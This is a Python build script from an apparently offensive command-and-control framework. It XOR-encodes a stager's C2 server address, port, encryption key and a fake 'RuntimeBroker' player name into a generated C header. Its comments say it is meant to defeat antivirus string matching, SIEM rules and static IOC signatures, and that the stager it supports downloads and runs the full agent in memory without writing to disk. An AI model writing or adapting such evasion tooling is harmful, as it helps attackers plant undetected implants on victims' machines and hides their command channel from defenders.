#!/usr/bin/env python3
"""
gen_obf.py — Build-time string obfuscation generator for the stager
====================================================================

PURPOSE
-------
This script is the stager's counterpart to gen_agent_str.py.  It reads
a configuration file (``obf_config.txt``) containing the C2 server address,
port, encryption key, and other deployment-specific values, then generates
a C header (``obf_strings.h``) that embeds those values in encoded form.

WHAT IS A STAGER?
-----------------
In a C2 framework, the "stager" is the first payload delivered to a target
machine.  It is usually a small binary whose only job is:
  1. Connect back to the C2 server (the attacker's machine).
  2. Download and execute the full agent in memory (without writing to disk).

The stager must know the C2 server's address and port at compile time, but
embedding them as plaintext strings would be an obvious IOC:
  - A scanner seeing "192.168.1.42" in a suspicious binary flags it.
  - A SIEM rule looking for the port number 20596 in file scans would fire.

By XOR-encoding those values, the binary contains only scrambled bytes at
rest.  The stager decodes them at runtime just before making the connection.

WHY A SEPARATE OBFUSCATION FILE FROM THE AGENT?
------------------------------------------------
The agent (gen_agent_str.py) and the stager (this script) have separate
obfuscation because:
  - They are compiled separately — different binaries, different key spaces.
  - A captured stager should not give an analyst any clue about the agent's
    encoding, and vice versa.
  - The stager's config (C2 host, port) is different from the agent's
    internal messages (protocol tokens, error strings, etc.).

WHAT DOES obf_config.txt LOOK LIKE?
-------------------------------------
A plain key=value text file, one entry per line, # for comments:
    STAGE_HOST=192.168.1.42
    STAGE_PORT=20596
    AGENT_SRV_HOST=192.168.1.42
    AGENT_SRV_PORT=20595
    AGENT_PLAYER=RuntimeBroker
    AGENT_KEY=0adC2DefaultKey

STAGE_HOST / STAGE_PORT : where the stager connects to download the agent.
AGENT_SRV_HOST/PORT     : the C2 address the downloaded agent should use.
AGENT_PLAYER            : the fake player name the agent uses in 0 A.D. packets.
AGENT_KEY               : the shared symmetric key for the C2 protocol.

HOW THE ROLLING XOR ENCODING WORKS
------------------------------------
Same algorithm as gen_agent_str.py (the two scripts share the design):
  k = seed
  for each byte b:
      encoded = b XOR k
      k = (k * 13 + 7) & 0xFF   # advance the key

The port number is encoded differently (as a 16-bit integer XOR) because
it is a number, not a string, and the C code uses it directly as an int.

HOW THE C CODE DECODES AT RUNTIME
-----------------------------------
The generated header contains:
  - OBF_SEED : the seed baked in at compile time
  - OBF_DECODE(out, arr, len) : a macro that calls _obf_decode()
  - For each string: OBF_XXX[] (encoded bytes) and OBF_XXX_LEN (length)
  - For the port: OBF_STAGE_PORT_ENC, OBF_STAGE_PORT_MASK, OBF_STAGE_PORT_VAL

The C code decodes like this:
    char host[256];
    OBF_DECODE(host, OBF_STAGE_HOST, OBF_STAGE_HOST_LEN);
    // host[] now contains the plaintext C2 address
    connect(fd, &addr, ...);

After the connection is made, the local variable goes out of scope and
the plaintext is gone — it was never in the binary in the first place.

Result: every ``make stager`` produces a statically different binary
(different encoded strings) -> bypasses static IOC-based signatures.

Usage: python3 gen_obf.py [config=obf_config.txt] [output=obf_strings.h]
"""

import sys
import os
import random

# ── Command-line arguments (with defaults) ─────────────────────────────────────
CONFIG_FILE = sys.argv[1] if len(sys.argv) > 1 else "obf_config.txt"   # deployment config
OUTPUT_FILE = sys.argv[2] if len(sys.argv) > 2 else "obf_strings.h"    # generated C header

# ── List of required keys ──────────────────────────────────────────────────────
# The script verifies that all of these are present in the config before
# proceeding.  Any missing key causes a clear error message and a non-zero
# exit code (which makes the Makefile stop the build).
EXPECTED_KEYS = [
    "STAGE_HOST",       # C2 server hostname or IP for the stager's initial connection
    "STAGE_PORT",       # TCP port the stager connects to
    "AGENT_SRV_HOST",   # C2 server address embedded in the agent (may differ from STAGE_HOST)
    "AGENT_SRV_PORT",   # TCP port the downloaded agent uses for its C2 channel
    "AGENT_PLAYER",     # fake 0 A.D. player name for the agent to use in NMT_CHAT packets
    "AGENT_KEY",        # shared secret key for the C2 encryption protocol
]


def rolling_xor_encode(data: bytes, seed: int) -> list[int]:
    """
    Encode bytes with a rolling (evolving) XOR key.

    Parameters
    ----------
    data : raw bytes to encode
    seed : initial key byte (must be 1-255; 0 is a no-op XOR)

    Returns
    -------
    List of encoded integer byte values (each 0-255).

    The key evolves as: k = (k * 13 + 7) & 0xFF
    This is a linear congruential generator (LCG) — the same family of
    algorithm used in old-school random number generators.  It is NOT
    cryptographically secure on its own, but it is enough to defeat
    static string matching by AV scanners.
    """
    out = []
    k = seed    # rolling key starts at the seed
    for b in data:
        out.append(b ^ k)            # encode this byte
        k = (k * 13 + 7) & 0xFF     # advance the key for the next byte
    return out


def main():
    # ── Read config ────────────────────────────────────────────────────────────
    config = {}
    if not os.path.exists(CONFIG_FILE):
        # If no config file is found, fall back to safe localhost defaults so
        # the build still works during development and testing.
        print(f"[gen_obf] Config '{CONFIG_FILE}' not found, using defaults")
        config = {
            "STAGE_HOST":     "127.0.0.1",       # loopback — connects to local machine
            "STAGE_PORT":     "20596",            # default stager TCP port
            "AGENT_SRV_HOST": "127.0.0.1",
            "AGENT_SRV_PORT": "20595",            # default agent C2 TCP port
            "AGENT_PLAYER":   "RuntimeBroker",    # fake Windows-like process name as player
            "AGENT_KEY":      "0adC2DefaultKey",  # placeholder symmetric key
        }
    else:
        # Parse the config file: key=value pairs, one per line.
        with open(CONFIG_FILE) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"): continue   # skip blank lines and comments
                k, _, v = line.partition("=")     # split on the FIRST '=' only
                config[k.strip()] = v.strip()     # store stripped key and value

    # Verify that every required key is present before going further.
    missing = [k for k in EXPECTED_KEYS if k not in config]
    if missing:
        print(f"[gen_obf] Missing keys in config: {missing}", file=sys.stderr)
        sys.exit(1)

    # ── Pick a random per-build seed ───────────────────────────────────────────
    # Avoid 0: XOR with 0 is the identity (b ^ 0 == b), which would leave the
    # first byte of every encoded string as plaintext.
    seed = random.randint(1, 255)
    print(f"[gen_obf] seed=0x{seed:02X}  output={OUTPUT_FILE}")

    # ── Start building the header lines ───────────────────────────────────────
    lines = []
    lines.append("/*")
    lines.append(f" * obf_strings.h — AUTO-GENERATED by gen_obf.py")
    lines.append(f" * seed=0x{seed:02X} — DO NOT EDIT MANUALLY")
    lines.append(" */")
    lines.append("")
    lines.append("#pragma once")         # prevent the header from being included twice
    lines.append("#include <stdint.h>")  # for uint8_t
    lines.append("#include <stddef.h>")  # for size_t
    lines.append("")

    # ── Inline decode function ─────────────────────────────────────────────────
    # _obf_decode() is the mirror image of rolling_xor_encode(): it runs the
    # same key evolution and XORs each encoded byte back to the original.
    # It is ``static inline`` so the compiler copies it into each translation
    # unit that includes this header, avoiding a separate linkable symbol.
    lines.append("/* Rolling XOR: k = (k*13+7) & 0xFF after each byte */")
    lines.append("static inline void _obf_decode(char *out, const uint8_t *enc,")
    lines.append("                                size_t len, uint8_t seed_v){")
    lines.append("    uint8_t k = seed_v;")   # start with the seed
    lines.append("    for(size_t i=0;i<len;i++){out[i]=(char)(enc[i]^k);k=(uint8_t)((k*13+7)&0xFF);}")
    lines.append("    out[len]='\\0';}") # null-terminate so callers get a proper C string
    lines.append("")
    # OBF_SEED is the single byte seed baked into this build.
    lines.append(f"#define OBF_SEED 0x{seed:02X}u")
    # OBF_DECODE is the public macro that all C code uses to decode a string.
    # Usage: OBF_DECODE(char_buf, OBF_STAGE_HOST, OBF_STAGE_HOST_LEN)
    lines.append("#define OBF_DECODE(out, arr, len) _obf_decode(out, arr, len, OBF_SEED)")
    lines.append("")

    # ── Encode each config value ───────────────────────────────────────────────
    for key in EXPECTED_KEYS:
        val = config[key]

        if key == "STAGE_PORT":
            # ── Special case: port number (integer, not a string) ──────────────
            # The port is stored as an XOR-masked integer rather than a string
            # because the C code uses it directly as ``int port = OBF_STAGE_PORT_VAL``.
            # We build a 16-bit mask by duplicating the seed byte in both halves:
            # xor_mask = (seed << 8) | seed = 0xSESEED where SEED is the seed byte.
            # This ensures the XOR affects both the high and low byte of the port.
            port = int(val)                         # convert string "20596" to integer 20596
            xor_mask = (seed << 8) | seed           # 16-bit mask, e.g. 0x4242 if seed is 0x42
            enc_port = port ^ xor_mask              # XOR the port with the mask
            lines.append(f"/* {key} = {val} */")
            lines.append(f"#define OBF_STAGE_PORT_MASK 0x{xor_mask:04X}u")   # the mask (known at compile time)
            lines.append(f"#define OBF_STAGE_PORT_ENC  0x{enc_port:04X}u")   # the encoded port value
            # At runtime: OBF_STAGE_PORT_VAL evaluates to the original port integer.
            lines.append(f"#define OBF_STAGE_PORT_VAL  ((int)(OBF_STAGE_PORT_ENC ^ OBF_STAGE_PORT_MASK))")
        else:
            # ── Normal case: encode a string with rolling XOR ──────────────────
            raw = val.encode("utf-8")               # convert to bytes
            enc = rolling_xor_encode(raw, seed)     # apply rolling XOR
            arr = ", ".join(f"0x{b:02X}" for b in enc)   # format as comma-separated hex literals
            cname = f"OBF_{key}"                    # C macro/variable name, e.g. OBF_STAGE_HOST
            lines.append(f"/* {key} = \"{val}\" ({len(raw)} bytes) */")
            lines.append(f"#define {cname}_LEN {len(raw)}u")               # byte count (for OBF_DECODE's len arg)
            lines.append(f"static const uint8_t {cname}[] = {{{arr}}};")   # the encoded byte array

        lines.append("")   # blank line between entries for readability

    # ── Write the generated header ─────────────────────────────────────────────
    with open(OUTPUT_FILE, "w") as f:
        f.write("\n".join(lines) + "\n")

    # Count non-empty lines as a quick sanity check printed to the console.
    print(f"[gen_obf] {OUTPUT_FILE} written ({sum(1 for l in lines if l)} active lines)")


if __name__ == "__main__":
    main()
